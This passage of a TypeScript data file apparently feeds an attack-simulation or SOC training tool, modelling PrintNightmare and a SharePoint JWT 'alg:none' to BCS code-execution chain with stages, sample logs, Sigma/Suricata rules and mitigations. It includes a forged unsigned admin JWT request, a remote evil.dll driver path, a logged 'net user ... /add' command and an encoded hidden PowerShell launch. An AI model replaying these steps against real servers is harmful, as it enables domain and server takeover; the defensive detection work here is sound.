        { term: 'BYPASS BITMASK', value: 'dwFileCopyFlags = 0x8014 (APD_INSTALL_WARNED_DRIVER = 0x8000)' },
        { term: 'SKIPPED CHECK', value: 'localspl.dll!ValidateObjectAccess(SPOOLER_OBJECT_SERVER)' },
      ],
    },
    {
      index: 2,
      title: 'UNC DRIVER COPY & SYSTEM DLL LOAD IN SPOOLSV.EXE',
      subtitle: 'spoolsv.exe copies \\\\10.10.20.55\\share\\evil.dll into \\spool\\drivers\\x64\\3\\ and loads it',
      description:
        'Inside the DRIVER_CONTAINER structure passed to RpcAddPrinterDriverEx(), the attacker sets pDriverPath to a legitimate local inbox driver (e.g., C:\\Windows\\System32\\DriverStore\\FileRepository\\...\\UNIDRV.DLL) and sets pConfigFile to an attacker-controlled SMB UNC path (\\\\10.10.20.55\\share\\evil.dll). Running as NT AUTHORITY\\SYSTEM, spoolsv.exe fetches evil.dll over SMB, copies it into C:\\Windows\\System32\\spool\\drivers\\x64\\3\\, and immediately calls LoadLibraryW() on pConfigFile.',
      mitreTacticPhase: 3,
      mitreTechniqueId: 'T1547.012',
      mitreTechniqueName: 'Boot or Logon Autostart Execution: Print Processors',
      activeNodeIds: ['printnightmare_user', 'target_spoolsv_server', 'spool_driver_dll_load', 'spooler_edr_siem'],
      compromisedNodeIds: ['target_spoolsv_server', 'spool_driver_dll_load'],
      keySpecs: [
        { term: 'REMOTE UNC PATH', value: 'pConfigFile = "\\\\10.10.20.55\\share\\evil.dll"' },
        { term: 'LOCAL DROP PATH', value: 'C:\\Windows\\System32\\spool\\drivers\\x64\\3\\Old\\1\\evil.dll' },
        { term: 'LOADER PROCESS', value: 'C:\\Windows\\System32\\spoolsv.exe (NT AUTHORITY\\SYSTEM)' },
      ],
    },
    {
      index: 3,
      title: 'DLLMAIN SYSTEM EXECUTION & DOMAIN CONTROLLER COMPROMISE',
      subtitle: 'Executing arbitrary code inside spoolsv.exe as NT AUTHORITY\\SYSTEM',
      description:
        'The moment spoolsv.exe loads the copied pConfigFile DLL to initialize the printer driver configuration, the attacker’s DllMain() function executes inside the high-privilege spoolsv.exe process as NT AUTHORITY\\SYSTEM—spawning a SYSTEM command shell, creating a new Domain Administrator account, or loading a Cobalt Strike Beacon.',
      mitreTacticPhase: 4,
      mitreTechniqueId: 'T1068',
      mitreTechniqueName: 'Exploitation for Privilege Escalation',
      activeNodeIds: ['spool_driver_dll_load', 'system_domain_takeover', 'spooler_edr_siem'],
      compromisedNodeIds: ['target_spoolsv_server', 'spool_driver_dll_load', 'system_domain_takeover'],
      keySpecs: [
        { term: 'EXECUTION CONTEXT', value: 'NT AUTHORITY\\SYSTEM inside spoolsv.exe (PID 2184)' },
        { term: 'EVENT LOG TRACE', value: 'Microsoft-Windows-PrintService/Admin EventID 316 / 808' },
        { term: 'HARDENING FIX', value: 'Disable Spooler service on DCs & RestrictDriverInstallationToAdministrators = 1' },
      ],
    },
  ],
  telemetry: [
    {
      id: 'pn-34527-1',
      no: 1,
      stageIndex: 1,
      timestamp: '16:40:11.204',
      sourceNodeId: 'printnightmare_user',
      targetNodeId: 'target_spoolsv_server',
      sourceLabel: '10.10.20.55',
      targetLabel: 'CORP-DC01 \\pipe\\spoolss',
      sourceType: 'NETWORK',
      protocolOrEventId: 'SMB2 / MS-RPRN Opnum 89',
      shortAction: 'RPCADDPRINTERDRIVEREX',
      info: 'MS-RPRN RpcAddPrinterDriverEx (Opnum 89) with dwFileCopyFlags=0x8014 and UNC pConfigFile',
      sizeOrCode: 'Flags 0x8014',
      severity: 'CRITICAL',
      mitreId: 'T1210',
      explanation:
        'Rapid7 and Elastic Security Labs documented that PrintNightmare invokes MS-RPRN Opnum 89 (RpcAddPrinterDriverEx) or MS-PAR RpcAsyncAddPrinterDriver with bit 0x8000 set.',
      rawLog: `[ZEEK_DCE_RPC] orig_h=10.10.20.55 resp_h=10.10.0.5 named_pipe="\\pipe\\spoolss" interface="spoolss" opnum=89 (RpcAddPrinterDriverEx)
dwFileCopyFlags=0x00008014 (APD_INSTALL_WARNED_DRIVER | APD_COPY_NEW_FILES | APD_COPY_FROM_DIRECTORY)
pConfigFile="\\\\10.10.20.55\\share\\evil.dll"`,
      detectionRule: {
        type: 'SURICATA',
        title: 'ET EXPLOIT Windows PrintNightmare MS-RPRN RpcAddPrinterDriverEx UNC Path (CVE-2021-34527)',
        ruleCode: `alert smb any any -> $HOME_NET 445 (msg:"CISA PrintNightmare CVE-2021-34527 RpcAddPrinterDriverEx over spoolss"; flow:established,to_server; content:"|59 00|"; content:"|14 80 00 00|"; sid:2033224; rev:1;)`,
        mitigation:
          'Stop and disable the Print Spooler service (Stop-Service -Name Spooler -Force; Set-Service -Name Spooler -StartupType Disabled) on all Domain Controllers and servers that do not print.',
      },
    },
    {
      id: 'pn-34527-2',
      no: 2,
      stageIndex: 2,
      timestamp: '16:40:11.682',
      sourceNodeId: 'target_spoolsv_server',
      targetNodeId: 'spool_driver_dll_load',
      sourceLabel: 'spoolsv.exe (PID 2184)',
      targetLabel: '\\spool\\drivers\\x64\\3\\evil.dll',
      sourceType: 'SYSMON',
      protocolOrEventId: 'Sysmon EID 7 & 11',
      shortAction: 'SPOOLER UNSIGNED DLL',
      info: 'spoolsv.exe writes and loads unsigned DLL in C:\\Windows\\System32\\spool\\drivers\\x64\\3\\Old\\1\\evil.dll',
      sizeOrCode: 'Unsigned DLL',
      severity: 'CRITICAL',
      mitreId: 'T1547.012',
      explanation:
        'Sysmon EventID 11 (FileCreate) followed immediately by EventID 7 (ImageLoad) of an unsigned DLL inside C:\\Windows\\System32\\spool\\drivers\\x64\\3\\ by spoolsv.exe is the canonical endpoint signature of PrintNightmare.',
      rawLog: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System><EventID>7</EventID></System>
  <EventData>
    <Data Name="Image">C:\\Windows\\System32\\spoolsv.exe</Data>
    <Data Name="ImageLoaded">C:\\Windows\\System32\\spool\\drivers\\x64\\3\\Old\\1\\evil.dll</Data>
    <Data Name="Signed">false</Data>
    <Data Name="User">NT AUTHORITY\\SYSTEM</Data>
  </EventData>
</Event>`,
      detectionRule: {
        type: 'SIGMA',
        title: 'PrintNightmare Unsigned DLL Loaded by spoolsv.exe from Spool Drivers Folder',
        ruleCode: `title: Windows Print Spooler Loading Unsigned Driver DLL (CVE-2021-34527)
logsource:
  category: image_load
  product: windows
detection:
  selection:
    Image|endswith: '\\spoolsv.exe'
    ImageLoaded|contains: '\\Windows\\System32\\spool\\drivers\\'
    Signed: 'false'
  condition: selection
level: critical`,
        mitigation:
          'Configure Point and Print Restrictions GPO and set RestrictDriverInstallationToAdministrators = 1 under HKLM\\Software\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint.',
      },
    },
    {
      id: 'pn-34527-3',
      no: 3,
      stageIndex: 3,
      timestamp: '16:40:12.019',
      sourceNodeId: 'spool_driver_dll_load',
      targetNodeId: 'system_domain_takeover',
      sourceLabel: 'spoolsv.exe (SYSTEM)',
      targetLabel: 'cmd.exe / net.exe (PID 8104)',
      sourceType: 'SYSMON',
      protocolOrEventId: 'Sysmon EID 1 + PrintService 316',
      shortAction: 'SPOOLSV CHILD SHELL',
      info: 'spoolsv.exe spawns cmd.exe / powershell.exe as NT AUTHORITY\\SYSTEM',
      sizeOrCode: 'SYSTEM RCE',
      severity: 'CRITICAL',
      mitreId: 'T1068',
      explanation:
        'Normal printer drivers never spawn command shells; spoolsv.exe spawning cmd.exe, powershell.exe, or rundll32.exe confirms active PrintNightmare code execution.',
      rawLog: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System><EventID>1</EventID></System>
  <EventData>
    <Data Name="Image">C:\\Windows\\System32\\cmd.exe</Data>
    <Data Name="CommandLine">cmd.exe /c net user pnightmare P@ssw0rd123! /add</Data>
    <Data Name="ParentImage">C:\\Windows\\System32\\spoolsv.exe</Data>
    <Data Name="User">NT AUTHORITY\\SYSTEM</Data>
  </EventData>
</Event>`,
      detectionRule: {
        type: 'SIGMA',
        title: 'Suspicious Child Process Spawned by Windows Print Spooler (spoolsv.exe)',
        ruleCode: `title: Spoolsv.exe Spawning Command Shell (PrintNightmare Post-Exploitation)
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    ParentImage|endswith: '\\spoolsv.exe'
    Image|endswith:
      - '\\cmd.exe'
      - '\\powershell.exe'
      - '\\rundll32.exe'
      - '\\net.exe'
  condition: selection
level: critical`,
        mitigation:
          'Delete unauthorized DLLs in C:\\Windows\\System32\\spool\\drivers\\x64\\3\\ and audit newly created local or domain administrator accounts.',
      },
    },
  ],
};

export const SHAREPOINT_CVE_2023_29357_24955_CHAIN_SCENARIO: AttackScenario = {
  id: 'sharepoint-cve-2023-29357-24955-chain',
  code: 'CVE-2023-29357',
  name: 'STAR Labs, Rapid7 & CISA — Microsoft SharePoint: JWT "alg:none" Auth Bypass to BCS RCE Chain',
  shortSubtitle: 'STAR Labs (Pwn2Own) · Rapid7 · CISA KEV · CVE-2023-29357 OAuth JWT Spoofing + CVE-2023-24955 .bdcm RCE',
  category: 'NETWORK_WEB',
  severity: 'CRITICAL',
  primaryMitrePhase: 1,
  overview:
    'Discovered by Nguyễn Tiến Giang (Jang) of STAR Labs at Pwn2Own Vancouver 2023 and documented by Microsoft MSRC, Rapid7, and CISA KEV, this scenario chains CVE-2023-29357 (CVSS 9.8 pre-authentication OAuth JWT signature validation bypass in Microsoft SharePoint Server) with CVE-2023-24955 (authenticated Business Connectivity Services RCE). Because SharePoint’s SPSecurityTokenServiceJsonMetadataDocument failed to reject JSON Web Tokens whose header specified "alg": "none", an unauthenticated attacker sends a forged JWT to /_api/web/siteusers with X-RequestForceAuthentication: true, impersonates the SharePoint Farm Administrator, and uploads a crafted Business Data Connectivity Model (.bdcm) containing a compiled .NET assembly to execute arbitrary code inside w3wp.exe.',
  specs: [
    {
      term: 'PRIMARY SOURCES',
      value: 'STAR Labs Research (Jang) · Microsoft MSRC · Rapid7 Analysis · CISA KEV CVE-2023-29357',
    },
    {
      term: 'MITRE TECHNIQUES',
      value: 'T1190 (Exploit Public App) · T1550.001 (Application Access Token: JWT alg:none) · T1505.003 (Server Code Exec)',
    },
    {
      term: 'CHAINED CVES',
      value: 'CVE-2023-29357 (JWT "alg":"none" Auth Bypass) + CVE-2023-24955 (BCS .bdcm Assembly RCE)',
    },
    {
      term: 'KEY TELEMETRY PATH',
      value: '/_api/web/siteusers (Bearer eyJ..."alg":"none") -> /_admin/BusinessDataMetadataCatalog -> w3wp.exe',
    },
  ],
  nodes: [
    {
      id: 'starlabs_jwt_actor',
      label: 'Remote SharePoint Exploiter',
      sublabel: '198.51.100.175 (Forged JWT "alg:none" Sender)',
      role: 'attacker',
      x: 14,
      y: 44,
      details: {
        osOrType: 'External Adversary HTTP Client',
        pidOrPort: 'HTTPS :443 -> /_api/web/siteusers',
        privilege: 'Unauthenticated External',
        artifacts: [
          'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0...',
          'Header: X-RequestForceAuthentication: true',
        ],
        description:
          'Attacker first reading the public SharePoint client_id/realm from a 401 WWW-Authenticate header, then crafting an unsigned JWT with "alg": "none".',
      },
    },
    {
      id: 'sharepoint_iis_server',
      label: 'SharePoint Server 2019 (IIS)',
      sublabel: '172.16.50.30 (/_api/web/ & Central Admin)',
      role: 'victim_host',
      x: 42,
      y: 28,
      details: {
        osOrType: 'Windows Server 2019 + Microsoft SharePoint Server 2019',
        pidOrPort: 'PID 4820 (w3wp.exe — SharePoint - 80/443 AppPool)',
        privilege: 'CORP\\sp_farm (SharePoint Farm Service Account)',
        artifacts: [
          'Microsoft.SharePoint.IdentityModel.OAuth2.SPJsonWebSecurityBaseTokenHandler',
          '/_api/web/siteusers & /_api/web/currentuser',
        ],
        description:
          'SharePoint web server whose OAuth2 JWT handler accepts "alg":"none" tokens when signing keys are fetched via the local metadata endpoint (CVE-2023-29357).',
      },
    },
    {
      id: 'jwt_admin_impersonator',
      label: 'OAuth2 JWT Admin Context',
      sublabel: 'nameid: S-1-5-21-...-500 (Farm Admin)',
      role: 'process',
      x: 56,
      y: 72,
      details: {
        osOrType: 'In-Memory SharePoint Claims Identity (w3wp.exe)',
        pidOrPort: 'PID 4820 (SPJsonWebSecurityTokenHandler.ValidateToken)',
        privilege: 'Site Collection & Farm Administrator',
        artifacts: [
          'JWT Claims: aud="00000003-0000-0ff1-ce00-000000000000@<realm>", nameid="<Admin_SID>"',
          'isloopback: true (Bypasses audience URI validation)',
        ],
        description:
          'By enumerating site admin SIDs via /_api/web/siteusers and minting a second "alg":"none" JWT with the Farm Admin’s nameid and nii claims, the attacker gains full admin privileges.',
      },
    },
    {
      id: 'bcs_bdcm_assembly_rce',
      label: 'BCS .bdcm DotNetAssembly RCE',
      sublabel: 'BusinessDataMetadataCatalog -> Process.Start',
      role: 'server',
      x: 78,
      y: 26,
      details: {
        osOrType: 'SharePoint Business Connectivity Services (BCS) Runtime',
        pidOrPort: 'PID 4820 -> PID 9120 (cmd.exe / powershell.exe)',
        privilege: 'CORP\\sp_farm (Tier-1 Server Admin)',
        artifacts: [
          'Malicious .bdcm XML model with Type="DotNetAssembly"',
          'Compiled C# LobSystem assembly executing System.Diagnostics.Process.Start()',
        ],
        description:
          'Chaining CVE-2023-24955 (or WebPart/PowerShell gadgets), the impersonated Farm Admin uploads a crafted BCS .bdcm metadata file containing a LobSystem DotNetAssembly that executes OS commands inside w3wp.exe.',
      },
    },
    {
      id: 'sharepoint_siem_sensor',
      label: 'SIEM & SharePoint ULS Sensor',
      sublabel: 'ULS Logs + IIS W3SVC + Sysmon EID 1',
      role: 'firewall_siem',
      x: 86,
      y: 66,
      details: {
        osOrType: 'SOC SIEM & Endpoint Detection',
        pidOrPort: 'SharePoint ULS Logs + IIS Logs + Sysmon EID 1',
        privilege: 'SOC Detection Engine',
        artifacts: [
          'HTTP Header Authorization: Bearer eyJhbGciOiJub25l... ("alg":"none")',
          'w3wp.exe spawning cmd.exe / powershell.exe',
        ],
        description:
          'Detects HTTP requests to /_api/* carrying "alg":"none" JWT headers (eyJhbGciOiJub25l) and SharePoint w3wp.exe spawning shell processes.',
      },
    },
  ],
  processTree: [
    {
      pid: 4820,
      ppid: 1088,
      name: 'w3wp.exe (SharePoint - 443)',
      commandLine: 'c:\\windows\\system32\\inetsrv\\w3wp.exe -ap "SharePoint - 443"',
      user: 'CORP\\sp_farm',
      integrity: 'High',
      status: 'suspicious',
      activeFromStage: 1,
      apiCalls: [
        'SPJsonWebSecurityBaseTokenHandler.ReadToken("eyJhbGciOiJub25l...")',
        'SPJsonWebSecurityTokenHandler.VerifySignature() -> SKIPPED (alg == none)',
      ],
    },
    {
      pid: 4820,
      ppid: 1088,
      name: 'w3wp.exe (BCS DotNetAssembly)',
      commandLine: 'BdcServiceApplication.ImportPackage(LobSystem Type="DotNetAssembly")',
      user: 'CORP\\sp_farm',
      integrity: 'High',
      status: 'injected',
      activeFromStage: 2,
      apiCalls: [
        'Assembly.Load(bdcmCompiledBytes)',
        'RuntimeMethodInfo.Invoke("ExecuteCommand")',
      ],
      memoryBlocks: [
        {
          address: '0x00007FF871900000',
          section: 'SharePoint OAuth2 JWT + BCS In-Memory Assembly',
          permissions: 'R-X',
          size: '64 KB',
          status: 'injected',
          description:
            'Unsigned JWT (alg:none) granting Farm Admin claims followed by in-memory Assembly.Load() from the imported .bdcm package.',
          hexPreview: '{"alg":"none","typ":"JWT"} . {"aud":"00000003-0000-0ff1-ce00-000000000000@...","isloopback":"true"}',
        },
      ],
    },
    {
      pid: 9120,
      ppid: 4820,
      name: 'powershell.exe (Child of SharePoint w3wp)',
      commandLine: 'powershell.exe -NoP -NonI -W Hidden -Enc ...',
      user: 'CORP\\sp_farm',
      integrity: 'High',
      status: 'malicious',
      activeFromStage: 3,
      apiCalls: ['CreateProcessW("powershell.exe")', 'WinHttpSendRequest()'],
    },
  ],
  stages: [
    {
      index: 1,
      title: 'FORGING AN UNSIGNED OAUTH JWT WITH "ALG: NONE" (CVE-2023-29357)',
      subtitle: 'Bypassing SharePoint OAuth2 signature verification via /_api/web/siteusers',
      description:
        'As discovered by STAR Labs, the attacker first sends an empty Bearer header to SharePoint to read the farm’s Realm UUID from the 401 WWW-Authenticate response header. Next, the attacker crafts a JSON Web Token (JWT) whose header sets "alg": "none" (base64: eyJhbGciOiJub25l...) and whose payload sets "isloopback": "true" and "nameid" to the built-in SharePoint app principal (00000003-0000-0ff1-ce00-000000000000). Because CVE-2023-29357 failed to forbid the "none" algorithm when parsing metadata tokens, SharePoint accepts the unsigned token without any cryptographic signature and returns the full list of Site Collection Administrators from /_api/web/siteusers!',
      mitreTacticPhase: 1,
      mitreTechniqueId: 'T1190',
      mitreTechniqueName: 'Exploit Public-Facing Application',
      activeNodeIds: ['starlabs_jwt_actor', 'sharepoint_iis_server', 'sharepoint_siem_sensor'],
      compromisedNodeIds: ['sharepoint_iis_server'],
      keySpecs: [
        { term: 'VULNERABILITY', value: 'CVE-2023-29357 (CVSS 9.8 SharePoint JWT Auth Bypass)' },
        { term: 'FORGED HEADER', value: '{"alg":"none","typ":"JWT"} (eyJhbGciOiJub25l)' },
        { term: 'ENUM ENDPOINT', value: 'GET /_api/web/siteusers (X-RequestForceAuthentication: true)' },
      ],
    },
    {
      index: 2,
      title: 'IMPERSONATING THE SHAREPOINT FARM ADMINISTRATOR',
      subtitle: 'Minting a second "alg:none" JWT with the Administrator’s UserInfo NameId and Windows SID',
      description:
        'From the /_api/web/siteusers XML response, the attacker extracts the Administrator’s NameId (Windows SID) and NameIdIssuer (nii). The attacker then constructs a second unsigned "alg": "none" JWT containing those exact administrator claims. Presenting this token in the Authorization: Bearer header allows the unauthenticated attacker to call privileged administrative SharePoint REST APIs and Central Administration endpoints as the Farm Administrator.',
      mitreTacticPhase: 5,
      mitreTechniqueId: 'T1550.001',
      mitreTechniqueName: 'Use Alternate Authentication Material: Application Access Token',
      activeNodeIds: ['starlabs_jwt_actor', 'sharepoint_iis_server', 'jwt_admin_impersonator', 'sharepoint_siem_sensor'],
      compromisedNodeIds: ['sharepoint_iis_server', 'jwt_admin_impersonator'],
      keySpecs: [
        { term: 'SPOOFED CLAIMS', value: 'nameid="<Admin_SID>" & nii="urn:office:idp:activedirectory"' },
        { term: 'BYPASS CLAIM', value: '"isloopback": "true" (Skips SharePoint HTTP Context URI Check)' },
        { term: 'GAINED PRIVILEGE', value: 'SharePoint Site Collection & Farm Administrator' },
      ],
    },
    {
      index: 3,
      title: 'BUSINESS CONNECTIVITY SERVICES (.BDCM) ASSEMBLY RCE (CVE-2023-24955)',
      subtitle: 'Uploading a crafted BCS .bdcm LobSystem DotNetAssembly to execute OS commands in w3wp.exe',
      description:
        'To turn SharePoint Administrator access into operating-system Remote Code Execution, the attacker chains CVE-2023-24955: importing a malicious Business Data Connectivity Model (.bdcm) XML file into the Business Data Metadata Catalog with a LobSystem of Type="DotNetAssembly", embedding a compiled .NET DLL byte stream, and triggering a Finder method call. SharePoint loads the attacker’s .NET assembly directly into w3wp.exe and spawns powershell.exe as the SharePoint Farm service account (CORP\\sp_farm).',
      mitreTacticPhase: 2,
      mitreTechniqueId: 'T1505.003',
      mitreTechniqueName: 'Server Software Component: Web Shell / Server Runtime Code',
      activeNodeIds: ['jwt_admin_impersonator', 'bcs_bdcm_assembly_rce', 'sharepoint_siem_sensor'],
      compromisedNodeIds: ['sharepoint_iis_server', 'jwt_admin_impersonator', 'bcs_bdcm_assembly_rce'],
      keySpecs: [
        { term: 'RCE GADGET', value: 'CVE-2023-24955 (BCS LobSystem Type="DotNetAssembly")' },
        { term: 'IN-MEMORY LOAD', value: 'Assembly.Load(bdcmBytes) inside SharePoint w3wp.exe' },
        { term: 'EXECUTION USER', value: 'CORP\\sp_farm (SharePoint Farm Service Account)' },
      ],
    },
  ],
  telemetry: [
    {
      id: 'sp-29357-1',
      no: 1,
      stageIndex: 1,
      timestamp: '08:52:10.114',
      sourceNodeId: 'starlabs_jwt_actor',
      targetNodeId: 'sharepoint_iis_server',
      sourceLabel: '198.51.100.175',
      targetLabel: 'SharePoint :443 /_api/web/siteusers',
      sourceType: 'NETWORK',
      protocolOrEventId: 'HTTP GET / CVE-2023-29357',
      shortAction: 'JWT ALG:NONE BYPASS',
      info: 'GET /_api/web/siteusers with Authorization: Bearer eyJhbGciOiJub25l... and X-RequestForceAuthentication: true',
      sizeOrCode: 'HTTP 200 OK',
      severity: 'CRITICAL',
      mitreId: 'T1190',
      explanation:
        'STAR Labs and Rapid7 showed that any JWT starting with eyJhbGciOiJub25l ("alg":"none") sent to /_api/web/siteusers bypasses signature verification on unpatched SharePoint servers.',
      rawLog: `GET /_api/web/siteusers HTTP/1.1
Host: sharepoint.corp.local
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJhdWQiOiIwMDAwMDAwMy0wMDAwLTBmZjEtY2UwMC0wMDAwMDAwMDAwMDBAY29ycCIsImlzbG9vcGJhY2siOiJ0cnVlIiwibmFtZWlkIjoiMDAwMDAwMDMtMDAwMC0wZmYxLWNlMDAtMDAwMDAwMDAwMDAwIn0.
X-RequestForceAuthentication: true`,
      detectionRule: {
        type: 'SURICATA',
        title: 'ET EXPLOIT Microsoft SharePoint CVE-2023-29357 JWT alg:none Authentication Bypass',
        ruleCode: `alert http any any -> $HOME_NET any (msg:"CISA KEV SharePoint CVE-2023-29357 JWT alg none Auth Bypass"; flow:established,to_server; http.header; content:"Authorization|3a 20|Bearer eyJhbGciOiJub25l"; sid:2048312; rev:1;)`,
        mitigation:
          'Install the June 2023 Microsoft SharePoint Server security update (KB5002402) which explicitly blocks unsigned "alg":"none" JWTs.',
      },
    },
    {
      id: 'sp-29357-2',
      no: 2,
      stageIndex: 2,
      timestamp: '08:52:11.408',
      sourceNodeId: 'sharepoint_iis_server',
      targetNodeId: 'jwt_admin_impersonator',
      sourceLabel: 'w3wp.exe (OAuth2 Handler)',
      targetLabel: 'SharePoint ULS Log',
      sourceType: 'WIN_EVENT',
      protocolOrEventId: 'SharePoint ULS OAuth2',
      shortAction: 'ADMIN JWT SPOOFED',
      info: 'SPJsonWebSecurityTokenHandler authenticates unsigned JWT with Farm Admin SID',
      sizeOrCode: 'Admin Claims',
      severity: 'CRITICAL',
      mitreId: 'T1550.001',
      explanation:
        'SharePoint Unified Logging System (ULS) logs show OAuth2 S2S authentication succeeding with an isloopback token from an external client IP.',
      rawLog: `[SharePoint ULS] Category="Application Authentication" Level="Medium"
Message="SPJsonWebSecurityTokenHandler: Successfully validated token for audience 00000003-0000-0ff1-ce00-000000000000 with isloopback=true and nameid=S-1-5-21-384192811-500"`,
      detectionRule: {
        type: 'SIGMA',
        title: 'SharePoint API Access Followed by Administrative Endpoint Invocation (CVE-2023-29357)',
        ruleCode: `title: Microsoft SharePoint CVE-2023-29357 SiteUsers Enumeration
logsource:
  category: webserver
detection:
  selection:
    cs-uri-stem|contains:
      - '/_api/web/siteusers'
      - '/_api/web/currentuser'
    sc-status: 200
  condition: selection
level: high`,
        mitigation:
          'Inspect IIS and SharePoint ULS logs for external requests to /_api/web/siteusers returning HTTP 200 without a preceding login session.',
      },
    },
    {
      id: 'sp-29357-3',
      no: 3,
      stageIndex: 3,
      timestamp: '08:52:15.920',
      sourceNodeId: 'jwt_admin_impersonator',
      targetNodeId: 'bcs_bdcm_assembly_rce',
      sourceLabel: 'w3wp.exe (PID 4820)',
      targetLabel: 'powershell.exe (PID 9120)',
      sourceType: 'SYSMON',
      protocolOrEventId: 'Sysmon EID 1',
      shortAction: 'BCS .BDCM SHELL RCE',
      info: 'SharePoint w3wp.exe loads BCS DotNetAssembly and spawns powershell.exe as CORP\\sp_farm',
      sizeOrCode: 'PID 9120',
      severity: 'CRITICAL',
      mitreId: 'T1505.003',
      explanation:
        'When the malicious .bdcm assembly executes inside w3wp.exe, Sysmon EventID 1 captures the SharePoint IIS worker spawning cmd.exe or powershell.exe.',
      rawLog: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System><EventID>1</EventID></System>
  <EventData>
    <Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
    <Data Name="CommandLine">powershell.exe -NoP -NonI -W Hidden -Enc ...</Data>
    <Data Name="ParentImage">C:\\Windows\\System32\\inetsrv\\w3wp.exe</Data>
    <Data Name="User">CORP\\sp_farm</Data>
  </EventData>
</Event>`,
      detectionRule: {
        type: 'SIGMA',
        title: 'SharePoint IIS Worker Process (w3wp.exe) Spawning Command Shell',
        ruleCode: `title: SharePoint w3wp.exe Spawning Suspicious Child Shell (CVE-2023-29357 / CVE-2023-24955)
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    ParentImage|endswith: '\\w3wp.exe'
    ParentCommandLine|contains: 'SharePoint'
    Image|endswith:
      - '\\cmd.exe'
      - '\\powershell.exe'
  condition: selection
level: critical`,
        mitigation:
          'Apply both KB5002402 (CVE-2023-29357) and May/June 2023 SharePoint updates (CVE-2023-24955), and audit the Business Data Metadata Catalog for unauthorized LobSystem assemblies.',
      },
    },
  ],
};

export const APT_BATCH2_AD_EXCHANGE_WINDOWS_SCENARIOS: AttackScenario[] = [
  NOPAC_SAMACCOUNTNAME_CVE_2021_42278_42287_SCENARIO,
  ZEROLOGON_NETLOGON_CVE_2020_1472_SCENARIO,
  PROXYSHELL_EXCHANGE_CVE_2021_34473_SCENARIO,
  PRINTNIGHTMARE_SPOOLER_CVE_2021_34527_SCENARIO,
  SHAREPOINT_CVE_2023_29357_24955_CHAIN_SCENARIO,
];
